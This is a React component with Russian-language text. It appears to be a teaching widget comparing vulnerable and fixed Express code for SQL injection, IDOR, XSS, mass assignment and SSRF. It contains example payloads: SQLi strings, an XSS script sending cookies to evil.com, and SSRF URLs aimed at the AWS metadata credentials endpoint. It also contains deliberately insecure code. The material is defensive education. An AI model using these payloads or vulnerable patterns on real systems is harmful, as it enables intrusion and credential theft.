'use client';

import { useState } from 'react';
import s from './VulnExplorer.module.scss';
import { CodeHighlight } from '@/components/ui/CodeHighlight/CodeHighlight';

// ── Data ──────────────────────────────────────────────────────────────────────

interface Vuln {
  id: string;
  label: string;
  owasp: string;
  color: string;
  desc: string;
  payloadLabel: string;
  payload: string;
  vulnerable: string;
  safe: string;
  tip: string;
}

const VULNS: Vuln[] = [
  {
    id: 'sqli',
    label: 'SQL Injection',
    owasp: 'A03',
    color: '#ff7b72',
    desc: 'Входные данные попадают напрямую в SQL-запрос. Атакующий изменяет логику запроса, читает любые таблицы, обходит авторизацию или удаляет данные.',
    payloadLabel: 'PAYLOAD',
    payload: "' OR '1'='1' --    →   возвращает всех пользователей\n' UNION SELECT password FROM admins --",
    vulnerable: `// ❌ Конкатенация строк — SQL Injection
app.get('/users', async (req, res) => {
  const { name } = req.query;

  // Атакующий передаёт: name=' OR '1'='1
  const sql = "SELECT * FROM users WHERE name = '"
              + name + "'";
  // Итог: WHERE name = '' OR '1'='1'
  //       → все пользователи

  const rows = await db.query(sql);
  res.json(rows);
});`,
    safe: `// ✓ Параметризованный запрос
app.get('/users', async (req, res) => {
  const { name } = req.query;

  // Данные передаются отдельно от SQL
  // БД никогда не интерпретирует их как код
  const rows = await db.query(
    'SELECT * FROM users WHERE name = $1',
    [name]
  );

  res.json(rows);
});

// ORM также параметризует автоматически:
// User.findAll({ where: { name } })  ✓`,
    tip: 'Никогда не вставляй переменные в SQL через конкатенацию или шаблонные строки. Всегда параметризованные запросы или ORM. Хранимые процедуры без динамического SQL тоже безопасны.',
  },
  {
    id: 'idor',
    label: 'IDOR',
    owasp: 'A01',
    color: '#f0c040',
    desc: 'Insecure Direct Object Reference: сервер проверяет только "ты залогинен?", но не "этот ресурс твой?". Атакующий перебирает ID и читает чужие данные.',
    payloadLabel: 'АТАКА',
    payload: 'Пользователь id=99 делает: GET /api/orders/1, /api/orders/2...\nили: GET /api/users/42/profile — чужой профиль',
    vulnerable: `// ❌ Проверяется только аутентификация
app.get('/api/orders/:id', authMiddleware, async (req, res) => {
  const order = await db.query(
    'SELECT * FROM orders WHERE id = $1',
    [req.params.id]
  );
  // Не проверяем принадлежность!
  // Любой залогиненный пользователь
  // читает любой заказ по id

  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});`,
    safe: `// ✓ Проверяем принадлежность ресурса
app.get('/api/orders/:id', authMiddleware, async (req, res) => {
  const order = await db.query(
    // user_id = текущий пользователь!
    'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
    [req.params.id, req.user.sub]
  );

  // Если заказ чужой → 0 строк → 404
  // Атакующий не узнает даже что заказ существует
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});`,
    tip: 'Золотое правило: при каждом запросе ресурса добавляй AND user_id = $currentUserId в WHERE. Если ресурс не найден — всегда 404 (не 403), иначе подтверждаешь существование чужих записей.',
  },
  {
    id: 'xss',
    label: 'XSS',
    owasp: 'A03',
    color: '#9b59e0',
    desc: 'Cross-Site Scripting: вредоносный скрипт отображается на странице и выполняется в браузере жертвы. Stored XSS сохраняется в БД и поражает всех посетителей.',
    payloadLabel: 'PAYLOAD',
    payload: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>\n<img src=x onerror="alert(document.cookie)">',
    vulnerable: `// ❌ Прямой вывод данных из БД в HTML
app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');

  // Атакующий сохранил в комментарии:
  // <script>document.location='evil.com?c='+document.cookie</script>
  const html = comments.map(c =>
    \`<div class="comment">\${c.text}</div>\`
    //                     ^^^^^^^^ RAW HTML — опасно!
  ).join('');

  res.send(\`<html><body>\${html}</body></html>\`);
});`,
    safe: `// ✓ Экранирование HTML + Content-Security-Policy
const escapeHtml = (str) =>
  str.replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;')
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#039;');

app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');

  const html = comments.map(c =>
    \`<div class="comment">\${escapeHtml(c.text)}</div>\`
  ).join('');

  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  res.send(\`<html><body>\${html}</body></html>\`);
  // В React/Vue экранирование автоматическое — {text} безопасен
});`,
    tip: 'В React/Vue/Angular {variable} экранируется автоматически — это безопасно. Опасен dangerouslySetInnerHTML / v-html. Всегда добавляй CSP заголовок как вторую линию защиты.',
  },
  {
    id: 'mass',
    label: 'Mass Assignment',
    owasp: 'A01',
    color: '#4db8ff',
    desc: 'Все поля из тела запроса передаются в UPDATE/INSERT без фильтрации. Атакующий добавляет поля role, isAdmin, balance и записывает их в БД.',
    payloadLabel: 'АТАКА',
    payload: 'PATCH /users/42  { "name": "Alice", "role": "admin", "isVerified": true }\nPUT /products/1  { "price": 0.01 }',
    vulnerable: `// ❌ req.body передаётся напрямую в UPDATE
app.patch('/users/:id', authMiddleware, async (req, res) => {
  // req.body = { name: "Alice", role: "admin" }
  // Атакующий добавил role: "admin" — попадёт в БД!

  await db.query(
    'UPDATE users SET ? WHERE id = $1',
    [req.body, req.params.id]  // всё тело = все поля
  );

  res.json({ success: true });
});`,
    safe: `// ✓ Явный allowlist разрешённых полей
app.patch('/users/:id', authMiddleware, async (req, res) => {
  // Явно перечисляем что можно обновлять
  const { name, email, bio } = req.body;

  // role, isAdmin, balance — даже если переданы,
  // они никуда не попадут
  await db.query(
    'UPDATE users SET name=$1, email=$2, bio=$3 WHERE id=$4',
    [name, email, bio, req.params.id]
  );

  res.json({ success: true });
});

// Или через validation schema (Zod/Joi):
// const schema = z.object({ name: z.string(), email: z.string().email() });
// const data = schema.parse(req.body);  // лишние поля отброшены`,
    tip: 'Никогда не передавай req.body напрямую в запрос к БД. Явно деструктурируй нужные поля или используй validation schema (Zod, Joi) — она отбрасывает всё лишнее.',
  },
  {
    id: 'ssrf',
    label: 'SSRF',
    owasp: 'A10',
    color: '#00e5a0',
    desc: 'Server-Side Request Forgery: сервер делает HTTP запрос по URL из запроса атакующего. Позволяет обращаться к внутренним сервисам и metadata API облачных провайдеров.',
    payloadLabel: 'АТАКА',
    payload: '{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }\n{ "url": "http://localhost:6379/" }  ← Redis без пароля',
    vulnerable: `// ❌ Запрос по URL из тела без валидации
app.post('/api/screenshot', async (req, res) => {
  const { url } = req.body;

  // Атакующий передаёт: http://169.254.169.254/...
  // Это адрес AWS Metadata Service!
  // Сервер с EC2 инстанса получит IAM credentials

  const response = await fetch(url);  // внутренний запрос!
  const data = await response.text();

  res.json({ content: data });
});`,
    safe: `// ✓ Whitelist доменов + блокировка внутренних адресов
const { URL } = require('url');
const dns = require('dns').promises;

const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
const PRIVATE_RANGES = [
  /^127\\./, /^10\\./, /^172\\.(1[6-9]|2\\d|3[01])\\./,
  /^192\\.168\\./, /^169\\.254\\./,  // AWS metadata
];

async function isSafeUrl(rawUrl) {
  const { hostname, protocol } = new URL(rawUrl);

  if (!['http:', 'https:'].includes(protocol)) return false;
  if (!ALLOWED_HOSTS.includes(hostname)) return false;

  // Проверить IP через DNS (защита от DNS rebinding)
  const addresses = await dns.resolve4(hostname);
  if (addresses.some(ip => PRIVATE_RANGES.some(r => r.test(ip)))) {
    return false;
  }
  return true;
}

app.post('/api/screenshot', async (req, res) => {
  if (!await isSafeUrl(req.body.url)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  // ... безопасный запрос
});`,
    tip: 'При любом функционале "fetch URL": whitelist доменов, блокировать file://, внутренние IP диапазоны и 169.254.x.x (AWS metadata). Проверять IP после DNS резолва — защита от DNS rebinding атаки.',
  },
];

// ── Component ─────────────────────────────────────────────────────────────────

export function VulnExplorer() {
  const [activeId, setActiveId] = useState('sqli');
  const vuln = VULNS.find(v => v.id === activeId)!;

  return (
    <div className={s.explorer}>

      {/* Tabs */}
      <div className={s.tabs}>
        {VULNS.map(v => (
          <button
            key={v.id}
            className={`${s.tab} ${activeId === v.id ? s.tabActive : ''}`}
            style={{ '--vc': v.color } as React.CSSProperties}
            onClick={() => setActiveId(v.id)}
          >
            {v.label}
          </button>
        ))}
      </div>

      {/* Attack */}
      <div className={s.attackPanel}>
        <div className={s.attackHeader}>
          <span className={s.vulnBadge} style={{ '--vc': vuln.color } as React.CSSProperties}>
            OWASP {vuln.owasp}
          </span>
          <span className={s.attackTitle}>{vuln.label}</span>
        </div>
        <p className={s.attackDesc}>{vuln.desc}</p>
        <div className={s.payloadBlock}>
          <span className={s.payloadLabel}>{vuln.payloadLabel}</span>
          <span className={s.payloadValue}>{vuln.payload}</span>
        </div>
      </div>

      {/* Code comparison */}
      <div className={s.codeGrid}>
        <div className={s.codePanel}>
          <div className={s.codePanelHeader}>
            <span className={s.codePanelDot} style={{ background: '#ff7b72' }} />
            <span className={s.codePanelLabel}>// Уязвимый код</span>
          </div>
          <pre className={`${s.codeBlock} ${s.codeBad}`}>{vuln.vulnerable}</pre>
        </div>
        <div className={s.codePanel}>
          <div className={s.codePanelHeader}>
            <span className={s.codePanelDot} style={{ background: '#00e5a0' }} />
            <span className={s.codePanelLabel}>// Защищённый код</span>
          </div>
          <pre className={`${s.codeBlock} ${s.codeGood}`}>{vuln.safe}</pre>
        </div>
      </div>

      {/* Tip */}
      <div className={s.tip}>
        <span className={s.tipIcon}>✓</span>
        {vuln.tip}
      </div>

    </div>
  );
}
